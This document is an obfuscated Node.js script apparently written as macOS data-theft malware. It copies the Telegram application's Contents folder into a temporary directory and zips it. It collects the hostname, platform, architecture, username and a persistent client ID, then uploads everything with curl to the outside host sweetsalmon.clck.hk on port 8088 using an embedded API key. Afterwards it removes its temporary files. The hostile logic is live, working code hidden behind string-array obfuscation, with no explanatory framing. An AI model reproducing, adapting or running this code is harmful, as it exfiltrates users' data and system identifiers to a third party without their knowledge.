const _0x1bda47=_0x4560;function _0x4fa6(){const _0x3ed31b=['readFileSync','Telegram\x20Contents\x20directory\x20not\x20found\x20at\x20','existsSync','/api/files/upload','\x20using\x20curl','0\x20Bytes','cwd','Upload\x20failed:\x20','Failed\x20to\x20create\x20temporary\x20directory\x20','Cleanup\x20failed:\x20','://','Failed\x20to\x20copy\x20Telegram\x20Contents','Error\x20saving\x20client\x20ID:\x20','substring',')\x20reached,\x20giving\x20up','toFixed','Server\x20response:\x20','120TbjAkw','zip\x20-r\x20-1\x20\x22','join','Cleanup\x20completed\x20successfully','tempDir','\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--connect-timeout\x2060\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--max-time\x20','Starting\x20Telegram\x20Contents\x20upload\x20process','trim','Upload\x20completed\x20in\x20','http','TelegramContents','path','telegram-system-info.json','Starting\x20upload\x20process...','lookup','Failed\x20to\x20create\x20ZIP\x20archive:\x20','Removing\x20existing\x20temporary\x20directory...','userInfo','pow','readdirSync','\x20of\x20','886039HXdNVK','now','Upload\x20failed:\x20Server\x20returned\x20failure','1632850AOaiJo','exit','5273256pPgbiQ','\x20items)','\x22\x20-x\x20\x22*.DS_Store\x22','Maximum\x20retry\x20count\x20(','serverDomain','Error\x20reading\x20client\x20ID:\x20','platform','statSync',')\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-F\x20\x22file=@','parse','toString','File\x20is\x20empty','appendFileSync','timeout','\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--progress-bar','Checking\x20if\x20Telegram\x20exists\x20at\x20','\x20seconds','writeFileSync','Creating\x20temporary\x20directory\x20','arch','Retrying\x20in\x20','https','Failed\x20to\x20copy\x20Telegram\x20Contents:\x20','size','tJz4uRVCwl2eEwyPTudYP9iGRfgq','log','4656369kFqcii','retryDelay','9BHcVXp','length','No\x20files\x20were\x20copied\x20to\x20','\x22\x20\x22','Removing\x20temporary\x20directory\x20','error','telegram_uploader.log','Successfully\x20copied\x20Telegram\x20Contents\x20(','utf8','message','dns','maxRetries','808518xNdeVa','Directory\x20not\x20found:\x20','child_process','Could\x20not\x20parse\x20server\x20response\x20as\x20JSON:\x20','telegramPath','client-id.txt','214795mQVopV','ZIP\x20archive\x20created:\x20','...','stringify','Server\x20returned\x20failure','type','floor','\x22\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-H\x20\x22X-Client-Info:\x20$(cat\x20','Removing\x20ZIP\x20file\x20','5KJqGmi','\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--retry-delay\x20','27105740kjtDsv','sweetsalmon.clck.hk','serverPort','DNS\x20resolution\x20error:\x20'];_0x4fa6=function(){return _0x3ed31b;};return _0x4fa6();}(function(_0x2a07a0,_0x4a5ec7){const _0x24ff17=_0x4560,_0x48b446=_0x2a07a0();while(!![]){try{const _0x16c37c=parseInt(_0x24ff17(0x1b8))/0x1+-parseInt(_0x24ff17(0x1bb))/0x2+parseInt(_0x24ff17(0x1d7))/0x3+parseInt(_0x24ff17(0x1bd))/0x4+parseInt(_0x24ff17(0x1f4))/0x5*(parseInt(_0x24ff17(0x1e5))/0x6)+parseInt(_0x24ff17(0x1eb))/0x7*(parseInt(_0x24ff17(0x1a3))/0x8)+-parseInt(_0x24ff17(0x1d9))/0x9*(parseInt(_0x24ff17(0x1f6))/0xa);if(_0x16c37c===_0x4a5ec7)break;else _0x48b446['push'](_0x48b446['shift']());}catch(_0x15e56b){_0x48b446['push'](_0x48b446['shift']());}}}(_0x4fa6,0xc94b9));const fs=require('fs'),os=require('os'),path=require(_0x1bda47(0x1ae)),{exec,execSync}=require(_0x1bda47(0x1e7)),dns=require(_0x1bda47(0x1e3)),CONFIG={'serverDomain':_0x1bda47(0x1f7),'serverPath':_0x1bda47(0x1fd),'serverPort':0x1f98,'apiKey':_0x1bda47(0x1d5),'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x927c0,'telegramPath':'/Applications/Telegram.app/Contents','tempDir':_0x1bda47(0x1ad)};function log(_0x5bbe83,_0x91bcaa=![]){const _0x7dbf1=_0x1bda47,_0x50c49a=new Date()['toISOString'](),_0x3bfbb2='['+_0x50c49a+']\x20'+_0x5bbe83;_0x91bcaa?console[_0x7dbf1(0x1de)](_0x3bfbb2):console[_0x7dbf1(0x1d6)](_0x3bfbb2);try{fs[_0x7dbf1(0x1c9)](_0x7dbf1(0x1df),_0x3bfbb2+'\x0a');}catch(_0x3e16b7){console['error']('Error\x20writing\x20to\x20log:\x20'+_0x3e16b7['message']);}}function _0x4560(_0x5ce034,_0x5d526c){const _0x4fa63a=_0x4fa6();return _0x4560=function(_0x4560df,_0x2eeb12){_0x4560df=_0x4560df-0x19b;let _0x4466c1=_0x4fa63a[_0x4560df];return _0x4466c1;},_0x4560(_0x5ce034,_0x5d526c);}function formatFileSize(_0x193b40){const _0x512c8d=_0x1bda47;if(_0x193b40===0x0)return _0x512c8d(0x1ff);const _0x51d7b9=0x400,_0x47f686=['Bytes','KB','MB','GB','TB'],_0x2fbb4a=Math[_0x512c8d(0x1f1)](Math[_0x512c8d(0x1d6)](_0x193b40)/Math[_0x512c8d(0x1d6)](_0x51d7b9));return parseFloat((_0x193b40/Math[_0x512c8d(0x1b5)](_0x51d7b9,_0x2fbb4a))[_0x512c8d(0x1a1)](0x2))+'\x20'+_0x47f686[_0x2fbb4a];}function getClientId(){const _0x46e098=_0x1bda47;try{if(fs[_0x46e098(0x1fc)](_0x46e098(0x1ea)))return fs[_0x46e098(0x1fa)](_0x46e098(0x1ea),_0x46e098(0x1e1))[_0x46e098(0x1aa)]();}catch(_0x38dfd1){log(_0x46e098(0x1c2)+_0x38dfd1['message'],!![]);}const _0x256a8e=Math['random']()[_0x46e098(0x1c7)](0x24)[_0x46e098(0x19f)](0x2,0xa);try{fs[_0x46e098(0x1ce)](_0x46e098(0x1ea),_0x256a8e);}catch(_0x4fc55c){log(_0x46e098(0x19e)+_0x4fc55c[_0x46e098(0x1e2)],!![]);}return _0x256a8e;}async function copyTelegramContents(){const _0x4319dc=_0x1bda47;try{log(_0x4319dc(0x1cc)+CONFIG['telegramPath']+'...');if(!fs['existsSync'](CONFIG[_0x4319dc(0x1e9)]))throw new Error(_0x4319dc(0x1fb)+CONFIG[_0x4319dc(0x1e9)]);log(_0x4319dc(0x1cf)+CONFIG['tempDir']+'...');fs[_0x4319dc(0x1fc)](CONFIG['tempDir'])&&(log(_0x4319dc(0x1b3)),execSync('rm\x20-rf\x20'+CONFIG[_0x4319dc(0x1a7)]));fs['mkdirSync'](CONFIG[_0x4319dc(0x1a7)],{'recursive':!![]}),log('Copying\x20Telegram\x20Contents\x20to\x20'+CONFIG[_0x4319dc(0x1a7)]+_0x4319dc(0x1ed));const _0x12ae2a='ditto\x20\x22'+CONFIG[_0x4319dc(0x1e9)]+_0x4319dc(0x1dc)+CONFIG[_0x4319dc(0x1a7)]+'\x22';execSync(_0x12ae2a);if(!fs[_0x4319dc(0x1fc)](CONFIG['tempDir']))throw new Error(_0x4319dc(0x202)+CONFIG['tempDir']);const _0x471d6d=fs[_0x4319dc(0x1b6)](CONFIG[_0x4319dc(0x1a7)]);if(_0x471d6d[_0x4319dc(0x1da)]===0x0)throw new Error(_0x4319dc(0x1db)+CONFIG[_0x4319dc(0x1a7)]);return log(_0x4319dc(0x1e0)+_0x471d6d['length']+_0x4319dc(0x1be)),!![];}catch(_0x5c5ed9){return log(_0x4319dc(0x1d3)+_0x5c5ed9[_0x4319dc(0x1e2)],!![]),![];}}async function createZipArchive(){const _0x2ad270=_0x1bda47;try{const _0x4d4a7a=getClientId(),_0x3eda21='id_t_'+_0x4d4a7a+'.zip';log('Creating\x20ZIP\x20archive:\x20'+_0x3eda21+_0x2ad270(0x1ed));if(!fs[_0x2ad270(0x1fc)](CONFIG[_0x2ad270(0x1a7)]))throw new Error(_0x2ad270(0x1e6)+CONFIG[_0x2ad270(0x1a7)]);const _0x2b23ed=_0x2ad270(0x1a4)+_0x3eda21+'\x22\x20\x22'+CONFIG[_0x2ad270(0x1a7)]+_0x2ad270(0x1bf);execSync(_0x2b23ed,{'encoding':_0x2ad270(0x1e1)});if(fs[_0x2ad270(0x1fc)](_0x3eda21)){const _0x124cb9=fs['statSync'](_0x3eda21);return log(_0x2ad270(0x1ec)+_0x3eda21+'\x20('+formatFileSize(_0x124cb9[_0x2ad270(0x1d4)])+')'),_0x3eda21;}else throw new Error('ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation');}catch(_0x6fd76b){return log(_0x2ad270(0x1b2)+_0x6fd76b[_0x2ad270(0x1e2)],!![]),null;}}async function resolveDomainAndUpload(_0x379c70,_0x143b48=0x0){const _0x5c9f30=_0x1bda47;log('Attempting\x20to\x20resolve\x20domain:\x20'+CONFIG[_0x5c9f30(0x1c1)]);try{const _0x5f46a4=await new Promise((_0x19c45f,_0x2a4265)=>{const _0x2198f4=_0x5c9f30;dns[_0x2198f4(0x1b1)](CONFIG['serverDomain'],(_0x45f480,_0x6f9c22)=>{_0x45f480?_0x2a4265(_0x45f480):_0x19c45f(_0x6f9c22);});});return log('Domain\x20'+CONFIG[_0x5c9f30(0x1c1)]+'\x20resolved\x20to\x20'+_0x5f46a4),uploadFileWithCurl(_0x379c70,_0x5f46a4,_0x143b48);}catch(_0x1e2119){return log(_0x5c9f30(0x1f9)+_0x1e2119['message'],!![]),_0x143b48<CONFIG[_0x5c9f30(0x1e4)]?(log(_0x5c9f30(0x1d1)+CONFIG[_0x5c9f30(0x1d8)]/0x3e8+'\x20seconds...\x20(Attempt\x20'+(_0x143b48+0x1)+_0x5c9f30(0x1b7)+CONFIG[_0x5c9f30(0x1e4)]+')'),await new Promise(_0x13cb81=>setTimeout(_0x13cb81,CONFIG['retryDelay'])),resolveDomainAndUpload(_0x379c70,_0x143b48+0x1)):(log(_0x5c9f30(0x1c0)+CONFIG[_0x5c9f30(0x1e4)]+_0x5c9f30(0x1a0),!![]),![]);}}async function uploadFileWithCurl(_0x4515ad,_0x1f8ca9,_0x1a4890=0x0){const _0x41605e=_0x1bda47;try{const _0x105de7=path['join'](process[_0x41605e(0x200)](),_0x4515ad);if(!fs[_0x41605e(0x1fc)](_0x105de7))return log('File\x20not\x20found:\x20'+_0x105de7,!![]),![];const _0x192416=fs[_0x41605e(0x1c4)](_0x105de7),_0x129301=_0x192416[_0x41605e(0x1d4)];if(_0x129301===0x0)return log(_0x41605e(0x1c8),!![]),![];const _0x13f9d7={'hostname':os['hostname'](),'platform':os[_0x41605e(0x1c3)](),'type':os[_0x41605e(0x1f0)](),'arch':os[_0x41605e(0x1d0)](),'username':os[_0x41605e(0x1b4)]()['username'],'id':'id_t_'+getClientId()},_0x3d2dfe=path[_0x41605e(0x1a5)](os['tmpdir'](),_0x41605e(0x1af));fs['writeFileSync'](_0x3d2dfe,JSON['stringify'](_0x13f9d7));const _0x2e9d28=CONFIG[_0x41605e(0x1f8)]===0x1bb?_0x41605e(0x1d2):_0x41605e(0x1ac);let _0x471879;_0x1f8ca9?_0x471879=_0x2e9d28+'://'+_0x1f8ca9+':'+CONFIG['serverPort']+CONFIG['serverPath']:_0x471879=_0x2e9d28+_0x41605e(0x19c)+CONFIG[_0x41605e(0x1c1)]+':'+CONFIG[_0x41605e(0x1f8)]+CONFIG['serverPath'];log('Starting\x20upload\x20to\x20'+_0x471879+_0x41605e(0x1fe));const _0x4a2090=Date['now'](),_0x16c780='curl\x20-X\x20POST\x20\x22'+_0x471879+_0x41605e(0x1f2)+_0x3d2dfe+_0x41605e(0x1c5)+_0x105de7+_0x41605e(0x1a8)+CONFIG[_0x41605e(0x1ca)]/0x3e8+'\x20\x5c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--retry\x20'+CONFIG[_0x41605e(0x1e4)]+_0x41605e(0x1f5)+CONFIG[_0x41605e(0x1d8)]/0x3e8+_0x41605e(0x1cb);return log('Executing\x20curl\x20command:\x20'+_0x16c780),new Promise((_0x452954,_0x1f606e)=>{exec(_0x16c780,(_0x3ded14,_0x476a15,_0x3b1f2b)=>{const _0x165b12=_0x4560;try{fs['unlinkSync'](_0x3d2dfe);}catch(_0xa19ce){}if(_0x3ded14){log('Curl\x20execution\x20error:\x20'+_0x3ded14[_0x165b12(0x1e2)],!![]),_0x1f606e(_0x3ded14);return;}const _0x6f53db=(Date[_0x165b12(0x1b9)]()-_0x4a2090)/0x3e8;log(_0x165b12(0x1ab)+_0x6f53db[_0x165b12(0x1a1)](0x2)+_0x165b12(0x1cd));try{const _0x89480f=JSON[_0x165b12(0x1c6)](_0x476a15);log(_0x165b12(0x1a2)+JSON[_0x165b12(0x1ee)](_0x89480f)),_0x89480f['success']?_0x452954(!![]):(log(_0x165b12(0x1ba),!![]),_0x1f606e(new Error(_0x165b12(0x1ef))));}catch(_0x167e65){log(_0x165b12(0x1e8)+_0x476a15),_0x452954(!![]);}});});}catch(_0x398836){return log(_0x41605e(0x201)+_0x398836[_0x41605e(0x1e2)],!![]),_0x1a4890<CONFIG[_0x41605e(0x1e4)]?(log(_0x41605e(0x1d1)+CONFIG[_0x41605e(0x1d8)]/0x3e8+'\x20seconds...\x20(Attempt\x20'+(_0x1a4890+0x1)+_0x41605e(0x1b7)+CONFIG[_0x41605e(0x1e4)]+')'),await new Promise(_0x96ba58=>setTimeout(_0x96ba58,CONFIG[_0x41605e(0x1d8)])),uploadFileWithCurl(_0x4515ad,_0x1f8ca9,_0x1a4890+0x1)):(log(_0x41605e(0x1c0)+CONFIG[_0x41605e(0x1e4)]+_0x41605e(0x1a0),!![]),![]);}}async function cleanup(_0x4c94f0){const _0x285905=_0x1bda47;try{return log('Performing\x20cleanup...'),fs[_0x285905(0x1fc)](CONFIG[_0x285905(0x1a7)])&&(log(_0x285905(0x1dd)+CONFIG['tempDir']+_0x285905(0x1ed)),execSync('rm\x20-rf\x20'+CONFIG[_0x285905(0x1a7)])),_0x4c94f0&&fs[_0x285905(0x1fc)](_0x4c94f0)&&(log(_0x285905(0x1f3)+_0x4c94f0+_0x285905(0x1ed)),fs['unlinkSync'](_0x4c94f0)),log(_0x285905(0x1a6)),!![];}catch(_0xde6183){return log(_0x285905(0x19b)+_0xde6183[_0x285905(0x1e2)],!![]),![];}}async function main(){const _0x2e3e61=_0x1bda47;try{log(_0x2e3e61(0x1a9));const _0x3d9eaa=await copyTelegramContents();!_0x3d9eaa&&(log(_0x2e3e61(0x19d),!![]),process[_0x2e3e61(0x1bc)](0x1));const _0x5501e7=await createZipArchive();!_0x5501e7&&(log('Failed\x20to\x20create\x20archive',!![]),await cleanup(null),process['exit'](0x1));log(_0x2e3e61(0x1b0));const _0x3ed3fd=await resolveDomainAndUpload(_0x5501e7);_0x3ed3fd?(log('Upload\x20completed\x20successfully'),await cleanup(_0x5501e7),process[_0x2e3e61(0x1bc)](0x0)):(log('Upload\x20failed',!![]),await cleanup(_0x5501e7),process[_0x2e3e61(0x1bc)](0x1));}catch(_0x4b0c7f){log('Unexpected\x20error:\x20'+_0x4b0c7f[_0x2e3e61(0x1e2)],!![]),await cleanup(null),process[_0x2e3e61(0x1bc)](0x1);}}main();
